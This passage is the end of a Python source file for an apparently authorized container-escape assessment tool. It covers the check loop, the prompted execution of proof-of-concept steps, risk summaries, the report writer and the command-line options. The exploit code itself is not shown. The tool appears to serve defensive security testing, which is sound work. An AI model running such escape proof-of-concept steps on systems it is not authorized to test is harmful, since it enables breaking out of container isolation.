    interactive = not ctx.args.scan_only and not ctx.args.auto

    for module_name, check_func in CHECK_MODULES:
        if interactive:
            if not prompt_user(f"Run check: {module_name}?", default="y"):
                print(f"  {DIM}Skipped.{RESET}")
                continue

        section_header(module_name)
        try:
            module_findings = check_func(ctx)
            all_findings.extend(module_findings)

            if not module_findings:
                print(f"  {GREEN}✓ No issues found in this category.{RESET}")
            else:
                for i, f in enumerate(module_findings):
                    print_finding(f, i)
        except Exception as e:
            print(f"  {RED}Error in {module_name}: {e}{RESET}")

    # Store all findings
    ctx.findings = all_findings

    # PoC execution phase
    poc_findings = [f for f in all_findings if f.poc_available and f.poc_func]
    if poc_findings:
        section_header("Proof of Concept Execution")
        print(f"  {YELLOW}{len(poc_findings)} PoCs available for discovered findings.{RESET}")

        if ctx.args.scan_only:
            print(f"  {DIM}Scan-only mode - skipping PoC execution.{RESET}")
        else:
            for i, f in enumerate(poc_findings):
                color = SEVERITY_COLORS.get(f.severity, RESET)
                print(f"\n  {color}[{f.severity.value}]{RESET} {f.title}")
                print(f"  {DIM}PoC: {f.poc_description}{RESET}")

                should_run = False
                if ctx.args.auto:
                    should_run = prompt_user(f"Execute PoC: {f.poc_description}?")
                elif interactive:
                    should_run = prompt_user(f"Execute PoC: {f.poc_description}?")

                if should_run:
                    try:
                        success = f.poc_func(ctx)
                        if success:
                            print(f"    {RED}{BOLD}PoC SUCCEEDED{RESET}")
                        else:
                            print(f"    {YELLOW}PoC did not achieve full exploitation{RESET}")
                    except Exception as e:
                        print(f"    {RED}PoC error: {e}{RESET}")

    # Final Summary
    print_summary(ctx, all_findings)

    # Save report
    if ctx.args.output:
        save_report(ctx, all_findings)


def print_summary(ctx: AssessmentContext, findings: List[Finding]):
    """Print assessment summary."""
    section_header("Assessment Summary")

    # Count by severity
    counts = {}
    for sev in Severity:
        counts[sev] = len([f for f in findings if f.severity == sev])

    print(f"  Total findings: {len(findings)}")
    for sev in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
        color = SEVERITY_COLORS.get(sev, RESET)
        print(f"    {color}{sev.value:10s}: {counts[sev]}{RESET}")

    poc_count = len([f for f in findings if f.poc_available])
    print(f"\n  PoCs available: {poc_count}")

    # Risk assessment
    if counts[Severity.CRITICAL] > 0:
        print(f"\n  {RED}{BOLD}OVERALL RISK: CRITICAL{RESET}")
        print(f"  {RED}Container escape is likely possible through one or more vectors.{RESET}")
    elif counts[Severity.HIGH] > 0:
        print(f"\n  {YELLOW}{BOLD}OVERALL RISK: HIGH{RESET}")
        print(f"  {YELLOW}Significant security weaknesses found. Escape may be possible.{RESET}")
    elif counts[Severity.MEDIUM] > 0:
        print(f"\n  {CYAN}{BOLD}OVERALL RISK: MEDIUM{RESET}")
        print(f"  {CYAN}Some security improvements recommended.{RESET}")
    else:
        print(f"\n  {GREEN}{BOLD}OVERALL RISK: LOW{RESET}")
        print(f"  {GREEN}Container appears reasonably hardened.{RESET}")

    # Top remediations
    remediations = [f for f in findings if f.remediation and f.severity in
                    (Severity.CRITICAL, Severity.HIGH)]
    if remediations:
        print(f"\n  {BOLD}Priority Remediations:{RESET}")
        seen = set()
        for f in remediations[:8]:
            if f.remediation not in seen:
                seen.add(f.remediation)
                print(f"    → {f.remediation}")


def save_report(ctx: AssessmentContext, findings: List[Finding]):
    """Save report to file."""
    output_path = ctx.args.output
    if not output_path.endswith(('.txt', '.md', '.json')):
        output_path += '.md'

    if output_path.endswith('.json'):
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "system": {
                "kernel": ctx.kernel_release,
                "root": ctx.is_root,
                "container": ctx.in_container,
                "runtime": ctx.container_runtime,
                "userns": ctx.userns_active,
            },
            "findings": [
                {
                    "category": f.category,
                    "title": f.title,
                    "severity": f.severity.value,
                    "detail": f.detail,
                    "evidence": f.evidence,
                    "poc_available": f.poc_available,
                    "remediation": f.remediation,
                }
                for f in findings
            ]
        }
        with open(output_path, "w") as f:
            json.dump(report_data, f, indent=2)
    else:
        with open(output_path, "w") as f:
            f.write(f"# Container Escape Assessment Report\n\n")
            f.write(f"**Date:** {datetime.now().isoformat()}\n")
            f.write(f"**Kernel:** {ctx.kernel_release}\n")
            f.write(f"**Container Runtime:** {ctx.container_runtime}\n")
            f.write(f"**Root:** {'Yes' if ctx.is_root else 'No'}\n\n")

            for sev in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]:
                sev_findings = [fi for fi in findings if fi.severity == sev]
                if sev_findings:
                    f.write(f"## {sev.value} Findings\n\n")
                    for fi in sev_findings:
                        f.write(f"### [{fi.severity.value}] {fi.title}\n")
                        f.write(f"**Category:** {fi.category}\n\n")
                        f.write(f"{fi.detail}\n\n")
                        if fi.evidence:
                            f.write(f"**Evidence:**\n```\n{fi.evidence}\n```\n\n")
                        if fi.poc_available:
                            f.write(f"**PoC:** {fi.poc_description}\n\n")
                        if fi.remediation:
                            f.write(f"**Remediation:** {fi.remediation}\n\n")
                        f.write("---\n\n")

    print(f"\n  {GREEN}Report saved to: {output_path}{RESET}")


# ─── Main Entry Point ────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="Container Escape Assessment Framework - Comprehensive container security analysis",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              %(prog)s                       Interactive mode (prompts for each check)
              %(prog)s --auto                Auto-run checks, prompt for PoCs
              %(prog)s --scan-only           Detection only, no PoC execution
              %(prog)s --output report.json  Save findings as JSON
              %(prog)s --no-sudo             Skip all sudo-based checks

            For authorized security testing only.
        """),
    )
    ap.add_argument("--auto", action="store_true",
                    help="Auto-run all checks (still prompts before PoCs)")
    ap.add_argument("--scan-only", action="store_true",
                    help="Detection only, no PoC prompts")
    ap.add_argument("--no-sudo", action="store_true",
                    help="Do not use sudo for any checks")
    ap.add_argument("--output", type=str, default="",
                    help="Save report to file (supports .md, .json, .txt)")
    ap.add_argument("--timeout", type=int, default=8,
                    help="Per-command timeout in seconds (default: 8)")
    ap.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")

    args = ap.parse_args()

    # Initialize context
    try:
        ctx = init_context(args)
    except Exception as e:
        print(f"{RED}Error initializing assessment context: {e}{RESET}")
        sys.exit(1)

    # Run assessment
    try:
        run_assessment(ctx)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Assessment interrupted by user.{RESET}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{RED}Assessment error: {e}{RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
